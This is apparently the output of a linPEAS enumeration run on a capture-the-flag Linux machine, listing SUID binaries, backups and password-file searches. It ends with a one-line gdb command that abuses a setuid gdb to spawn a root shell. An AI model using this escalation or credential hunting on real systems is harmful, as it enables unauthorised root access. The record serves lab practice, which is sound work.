reboot   system boot  Wed Feb 15 14:46:11 2023   still running                         0.0.0.0
reboot   system boot  Sun Jan 29 11:58:36 2023   still running                         0.0.0.0

wtmp begins Sun Jan 29 11:58:36 2023

[+] Last time logon each user
Username         Port     From             Latest                                 
gaara            pts/0    192.168.45.156   Wed May 17 21:44:33 -0400 2023

[+] Password policy
PASS_MAX_DAYS   99999                                                             
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                   
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                   
                                                                                  

═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════                                                                      
[+] MySQL version                                                                 
mysql Not Found                                                                   
                                                                                  
[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                       
[+] MySQL connection using root/NOPASS ................. No                       
[+] Searching mysql credentials and exec                                          
                                                                                  
[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                        
                                                                                  
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No          
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No          
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No          
                                                                                  
[+] Apache server info
Version: Server version: Apache/2.4.38 (Debian)                                   
Server built:   2020-08-25T20:08:29
PHP exec extensions

[+] Searching PHPCookies
 Not Found                                                                        
                                                                                  
[+] Searching Wordpress wp-config.php files
wp-config.php Not Found                                                           
                                                                                  
[+] Searching Drupal settings.php files
/default/settings.php Not Found                                                   
                                                                                  
[+] Searching Moodle config.php files
config.php inside a moodle folder Not Found                                       
                                                                                  
[+] Searching Tomcat users file
tomcat-users.xml Not Found                                                        
                                                                                  
[+] Mongo information
mongo binary Not Found                                                            
                                                                                  
[+] Searching supervisord configuration file
supervisord.conf Not Found                                                        
                                                                                  
[+] Searching cesi configuration file
cesi.conf Not Found                                                               
                                                                                  
[+] Searching Rsyncd config file
rsyncd.conf Not Found                                                             
[+] Searching Hostapd config file                                                 
hostapd.conf Not Found                                                            
                                                                                  
[+] Searching wifi conns file
 Not Found                                                                        
                                                                                  
[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found                                                         
                                                                                  
[+] Searching .vnc directories and their passwd files
.vnc Not Found                                                                    
                                                                                  
[+] Searching ldap directories and their hashes
/etc/ldap                                                                         
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found                                                                   
                                                                                  
[+] Searching ssl/ssh files
ChallengeResponseAuthentication no                                                
UsePAM yes
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No                                                                                
                                                                                  
[+] Searching Cloud credentials (AWS, Azure, GC)
                                                                                  
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                              
/etc/exports Not Found                                                            
                                                                                  
[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                               
tickets kerberos Not Found                                                        
klist Not Found                                                                   
                                                                                  
[+] Searching Kibana yaml
kibana.yml Not Found                                                              
                                                                                  
[+] Searching Knock configuration
Knock.config Not Found                                                            
                                                                                  
[+] Searching logstash files
 Not Found                                                                        
                                                                                  
[+] Searching elasticsearch files
 Not Found                                                                        
                                                                                  
[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found                                                    
                                                                                  
[+] Searching AD cached hashes
cached hashes Not Found                                                           
                                                                                  
[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                 
screen Not Found                                                                  
                                                                                  
[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                                 
tmux Not Found                                                                    
                                                                                  
[+] Searching Couchdb directory
                                                                                  
[+] Searching redis.conf
                                                                                  
[+] Searching dovecot files
dovecot credentials Not Found                                                     
                                                                                  
[+] Searching mosquitto.conf
                                                                                  
[+] Searching neo4j auth file
                                                                                  
[+] Searching Cloud-Init conf file
                                                                                  
[+] Searching Erlang cookie file
                                                                                  
[+] Searching GVM auth file
                                                                                  
[+] Searching IPSEC files
                                                                                  
[+] Searching IRSSI files
                                                                                  
[+] Searching Keyring files
Keyring folder: /usr/share/keyrings                                               
/usr/share/keyrings:
total 132
-rw-r--r-- 1 root root  8132 Apr 23  2019 debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root  8141 Apr 23  2019 debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root  2332 Apr 23  2019 debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root  5106 Apr 23  2019 debian-archive-jessie-automatic.gpg
-rw-r--r-- 1 root root  5115 Apr 23  2019 debian-archive-jessie-security-automatic.gpg
-rw-r--r-- 1 root root  2763 Apr 23  2019 debian-archive-jessie-stable.gpg
-rw-r--r-- 1 root root 48747 Apr 23  2019 debian-archive-keyring.gpg
-rw-r--r-- 1 root root 23889 Apr 23  2019 debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root  7443 Apr 23  2019 debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root  7452 Apr 23  2019 debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root  2263 Apr 23  2019 debian-archive-stretch-stable.gpg

[+] Searching Filezilla sites file
                                                                                  
[+] Searching backup-manager files
                                                                                  
[+] Searching uncommon passwd files (splunk)
                                                                                  
[+] Searching GitLab related files
                                                                                  

[+] Searching PGP/GPG
PGP/GPG software:                                                                 
gpg Not Found
netpgpkeys Not Found                                                              
netpgp Not Found                                                                  
                                                                                  
[+] Searching vim files
                                                                                  
[+] Checking if containerd(ctr) is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation                                                                 
                                                                                  
[+] Checking if runc is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                                                                           
                                                                                  
[+] Searching docker files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                                                                              
                                                                                  
[+] Interesting Firefox Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox                                                                             
                                                                                  
[+] Interesting Chrome Files
[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox                                                                             
                                                                                  
[+] Autologin Files
                                                                                  


[+] S/Key authentication
                                                                                  
[+] YubiKey authentication
                                                                                  
[+] Passwords inside pam.d
                                                                                  
[+] FastCGI Params
                                                                                  

[+] SNMPs
                                                                                  


════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════                                                                       
[+] SUID - Check easy privesc, exploits and write perms                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
strings Not Found                                                                 
strace Not Found                                                                  
-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device  
-rwsr-xr-x 1 root root        63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)       
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root        83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root        53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-sr-x 1 root root       7.3M Dec 24  2018 /usr/bin/gimp-2.10
-rwsr-xr-x 1 root root        35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)                                                                            
-rwsr-xr-x 1 root root        63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root        51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                  
-rwsr-sr-x 1 root root       7.7M Oct 14  2019 /usr/bin/gdb
-rwsr-xr-x 1 root root       427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root       154K Feb  2  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root        35K Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-- 1 root messagebus  50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                          

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid     
-rwxr-sr-x 1 root mail     19K Dec  3  2017 /usr/bin/dotlockfile                  
-rwxr-sr-x 1 root tty      15K May  4  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow   31K Jul 27  2018 /usr/bin/expiry
-rwxr-sr-x 1 root shadow   71K Jul 27  2018 /usr/bin/chage
-rwsr-sr-x 1 root root    7.3M Dec 24  2018 /usr/bin/gimp-2.10
-rwxr-sr-x 1 root tty      35K Jan 10  2019 /usr/bin/wall
-rwxr-sr-x 1 root shadow   39K Feb 14  2019 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root crontab  43K Oct 11  2019 /usr/bin/crontab
-rwsr-sr-x 1 root root    7.7M Oct 14  2019 /usr/bin/gdb
-rwxr-sr-x 1 root ssh     315K Jan 31  2020 /usr/bin/ssh-agent

[+] Checking misconfigurations of ld.so
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so             
/etc/ld.so.conf                                                                   
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities      
Current capabilities:                                                             
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities:
/usr/bin/ping = cap_net_raw+ep

[+] Users with capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities      
/etc/security/capability.conf Not Found                                           
                                                                                  
[+] Files with ACLs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls              
files with acls in searched folders Not Found                                     
                                                                                  
[+] .sh files in path
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                             
/usr/bin/gettext.sh                                                               

[+] Unexpected in root
/vmlinuz.old                                                                      
/lost+found
/lib32
/vmlinuz
/initrd.img
/initrd.img.old
/libx32

[+] Files (scripts) in /etc/profile.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files    
total 12                                                                          
drwxr-xr-x  2 root root 4096 Dec 13  2020 .
drwxr-xr-x 85 root root 4096 Apr 27  2021 ..
-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh

[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                        
                                                                                  
[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ No                                     
[+] Credentials in fstab/mtab? ........... No                                     
[+] Can I read shadow files? ............. No                                     
[+] Can I read opasswd file? ............. No                                     
[+] Can I write in network-scripts? ...... No                                     
[+] Can I read root folder? .............. No                                     
                                                                                  
[+] Searching root files in home dirs (limit 30)
/home/                                                                            
/home/gaara/.bash_history
/root/

[+] Searching folders owned by me containing others files on it
                                                                                  
[+] Readable files belonging to root and readable by me but not world readable
                                                                                  
[+] Modified interesting files in the last 5mins (limit 100)
/var/log/lastlog                                                                  
/var/log/daemon.log
/var/log/wtmp
/var/log/auth.log
/var/log/btmp
/var/log/syslog

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                              
logrotate 3.14.0                                                                  

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

[+] Files inside /home/gaara (limit 20)
total 360                                                                         
drwxr-xr-x 2 gaara gaara   4096 May 17 21:47 .
drwxr-xr-x 3 root  root    4096 Dec 13  2020 ..
lrwxrwxrwx 1 root  root       9 Mar 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 gaara gaara    220 Dec 13  2020 .bash_logout
-rw-r--r-- 1 gaara gaara   3526 Dec 13  2020 .bashrc
-rw-r--r-- 1 gaara gaara     32 Apr 27  2021 flag.txt
-rwxr-xr-x 1 gaara gaara 332111 May  5 04:06 linpeas.sh
-rw-r--r-- 1 gaara gaara     33 May 17 21:16 local.txt
-rw-r--r-- 1 gaara gaara    807 Dec 13  2020 .profile
-rw------- 1 gaara gaara    102 Dec 13  2020 .Xauthority

[+] Files inside others home (limit 20)
                                                                                  
[+] Searching installed mail applications
                                                                                  
[+] Mails (limit 50)
                                                                                  
[+] Backup folders
drwxr-xr-x 2 root root 4096 May 17 21:23 /var/backups                             
total 1652
-rw-r--r-- 1 root root    40960 Dec 13  2020 alternatives.tar.0
-rw-r--r-- 1 root root    25581 Mar 30  2021 apt.extended_states.0
-rw-r--r-- 1 root root     2730 Dec 13  2020 apt.extended_states.1.gz
-rw-r--r-- 1 root root      186 Dec 13  2020 dpkg.diversions.0
-rw-r--r-- 1 root root      126 Dec 13  2020 dpkg.diversions.1.gz
-rw-r--r-- 1 root root      126 Dec 13  2020 dpkg.diversions.2.gz
-rw-r--r-- 1 root root      126 Dec 13  2020 dpkg.diversions.3.gz
-rw-r--r-- 1 root root      126 Dec 13  2020 dpkg.diversions.4.gz
-rw-r--r-- 1 root root      126 Dec 13  2020 dpkg.diversions.5.gz
-rw-r--r-- 1 root root      126 Dec 13  2020 dpkg.diversions.6.gz
-rw-r--r-- 1 root root      135 Dec 13  2020 dpkg.statoverride.0
-rw-r--r-- 1 root root      142 Dec 13  2020 dpkg.statoverride.1.gz
-rw-r--r-- 1 root root      142 Dec 13  2020 dpkg.statoverride.2.gz
-rw-r--r-- 1 root root      142 Dec 13  2020 dpkg.statoverride.3.gz
-rw-r--r-- 1 root root      142 Dec 13  2020 dpkg.statoverride.4.gz
-rw-r--r-- 1 root root      142 Dec 13  2020 dpkg.statoverride.5.gz
-rw-r--r-- 1 root root      142 Dec 13  2020 dpkg.statoverride.6.gz
-rw-r--r-- 1 root root   605642 Mar 30  2021 dpkg.status.0
-rw-r--r-- 1 root root   166524 Mar 30  2021 dpkg.status.1.gz
-rw-r--r-- 1 root root   166524 Mar 30  2021 dpkg.status.2.gz
-rw-r--r-- 1 root root   166524 Mar 30  2021 dpkg.status.3.gz
-rw-r--r-- 1 root root   166524 Mar 30  2021 dpkg.status.4.gz
-rw-r--r-- 1 root root   163457 Dec 13  2020 dpkg.status.5.gz
-rw-r--r-- 1 root root    99155 Dec 13  2020 dpkg.status.6.gz
-rw------- 1 root root      727 Dec 13  2020 group.bak
-rw------- 1 root shadow    607 Dec 13  2020 gshadow.bak
-rw------- 1 root root     1478 Dec 13  2020 passwd.bak
-rw------- 1 root shadow    975 Apr 27  2021 shadow.bak


[+] Backup files
-rw-r--r-- 1 root root 9716 Nov 28  2020 /usr/lib/modules/4.19.0-13-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 43736 Oct  9  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 194817 Nov 23  2016 /usr/share/doc/x11-common/changelog.Debian.old.gz
-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz
-rwxr-xr-x 1 root root 1513 Oct 19  2013 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz

[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
                                                                                  
[+] Web files?(output limit)
/var/www/:                                                                        
total 12K
drwxr-xr-x  3 root root 4.0K Dec 13  2020 .
drwxr-xr-x 12 root root 4.0K Dec 13  2020 ..
drwxr-xr-x  2 root root 4.0K Mar 30  2021 html

/var/www/html:
total 192K
drwxr-xr-x 2 root root 4.0K Mar 30  2021 .
drwxr-xr-x 3 root root 4.0K Dec 13  2020 ..

[+] Readable hidden interesting files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                                 
                                                                                  
[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                                                                             
-rw-r--r-- 1 root root 102 Oct 11  2019 /etc/cron.weekly/.placeholder             
-rw-r--r-- 1 root root 0 Dec 19  2018 /etc/sensors.d/.placeholder
-rw------- 1 root root 0 Dec 13  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 102 Oct 11  2019 /etc/cron.d/.placeholder
-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 102 Oct 11  2019 /etc/cron.hourly/.placeholder
-rw-r--r-- 1 root root 102 Oct 11  2019 /etc/cron.daily/.placeholder
-rw-r--r-- 1 root root 102 Oct 11  2019 /etc/cron.monthly/.placeholder
-rw-r--r-- 1 root root 0 Feb 17 12:19 /run/network/.ifstate.lock
-rw-r--r-- 1 root staff 36 Dec 13  2020 /usr/local/share/fonts/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/fonts/cmap/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/fonts/truetype/droid/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/fonts/truetype/dejavu/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/fonts/truetype/noto/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/fonts/truetype/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/fonts/cMap/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/fonts/type1/gsfonts/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/fonts/type1/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/fonts/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/poppler/cMap/Adobe-GB1/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/poppler/cMap/Adobe-Japan1/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/poppler/cMap/Adobe-Japan2/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/poppler/cMap/Adobe-Korea1/.uuid
-rw-r--r-- 1 root root 36 Dec 13  2020 /usr/share/poppler/cMap/Adobe-CNS1/.uuid
-rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
-rw-r--r-- 1 gaara gaara 3526 Dec 13  2020 /home/gaara/.bashrc
-rw-r--r-- 1 gaara gaara 807 Dec 13  2020 /home/gaara/.profile
-rw------- 1 gaara gaara 102 Dec 13  2020 /home/gaara/.Xauthority
-rw-r--r-- 1 gaara gaara 220 Dec 13  2020 /home/gaara/.bash_logout

[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                        
-rw-r--r-- 1 root root 126 Dec 13  2020 /var/backups/dpkg.diversions.1.gz         
-rw-r--r-- 1 root root 126 Dec 13  2020 /var/backups/dpkg.diversions.5.gz
-rw-r--r-- 1 root root 99155 Dec 13  2020 /var/backups/dpkg.status.6.gz
-rw-r--r-- 1 root root 126 Dec 13  2020 /var/backups/dpkg.diversions.3.gz
-rw-r--r-- 1 root root 142 Dec 13  2020 /var/backups/dpkg.statoverride.6.gz
-rw-r--r-- 1 root root 2730 Dec 13  2020 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 142 Dec 13  2020 /var/backups/dpkg.statoverride.5.gz
-rw-r--r-- 1 root root 166524 Mar 30  2021 /var/backups/dpkg.status.3.gz
-rw-r--r-- 1 root root 166524 Mar 30  2021 /var/backups/dpkg.status.4.gz
-rw-r--r-- 1 root root 126 Dec 13  2020 /var/backups/dpkg.diversions.2.gz
-rw-r--r-- 1 root root 166524 Mar 30  2021 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 40960 Dec 13  2020 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 135 Dec 13  2020 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 605642 Mar 30  2021 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 126 Dec 13  2020 /var/backups/dpkg.diversions.4.gz
-rw-r--r-- 1 root root 166524 Mar 30  2021 /var/backups/dpkg.status.2.gz
-rw-r--r-- 1 root root 186 Dec 13  2020 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 142 Dec 13  2020 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 163457 Dec 13  2020 /var/backups/dpkg.status.5.gz
-rw-r--r-- 1 root root 142 Dec 13  2020 /var/backups/dpkg.statoverride.3.gz
-rw-r--r-- 1 root root 142 Dec 13  2020 /var/backups/dpkg.statoverride.4.gz
-rw-r--r-- 1 root root 142 Dec 13  2020 /var/backups/dpkg.statoverride.2.gz
-rw-r--r-- 1 root root 25581 Mar 30  2021 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 126 Dec 13  2020 /var/backups/dpkg.diversions.6.gz

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                                          
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files    
/dev/mqueue                                                                       
/dev/shm
/home/gaara
/run/lock
/run/user/1001
/run/user/1001/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/local/games
/var/tmp

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files    
  Group gaara:                                                                    
                                                                                  

[+] Searching passwords in config PHP files
                                                                                  
[+] Checking for TTY (sudo/su) passwords in audit logs
                                                                                  
[+] Finding IPs inside logs (limit 70)
      1 /var/log/wtmp:192.168.45.156                                              
      1 /var/log/lastlog:192.168.45.156

[+] Finding passwords inside logs (limit 70)
                                                                                  
[+] Finding emails inside logs (limit 70)
                                                                                  
[+] Finding *password* or *credential* files in home (limit 70)
                                                                                  
[+] Finding passwords inside key folders (limit 70) - only PHP files
                                                                                  
[+] Finding passwords inside key folders (limit 70) - no PHP files
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.                                                         
/etc/debconf.conf:#BindPasswd: secret
/etc/nsswitch.conf:passwd:         files systemd
/etc/pam.d/common-password:password     [success=1 default=ignore]      pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
/etc/ssl/openssl.cnf:challengePassword_max              = 20
/etc/ssl/openssl.cnf:challengePassword_min              = 4
/etc/ssl/openssl.cnf:# input_password = secret
/etc/ssl/openssl.cnf:# output_password = secret
/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password  xxxxxx/g' > \
/var/backups/dpkg.status.0:Depends: passwd, debconf (>= 0.5) | debconf-2.0

[+] Finding possible password variables inside key folders (limit 140)
                                                                                  
[+] Finding possible password in config files
 /etc/reportbug.conf                                                              
password for SMTP
passwd XXX
 /etc/debconf.conf
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret
 /etc/adduser.conf
passwd
 /etc/apache2/apache2.conf
passwd files from being
 /etc/nsswitch.conf
passwd:         files systemd

[+] Finding 'username' string inside key folders (limit 70)
                                                                                  
[+] Searching specific hashes inside files - less false positives (limit 70)

```

```
gdb -nx -ex 'python import os; os.execl ("/bin/sh", "sh", "-p")' -ex quit
```


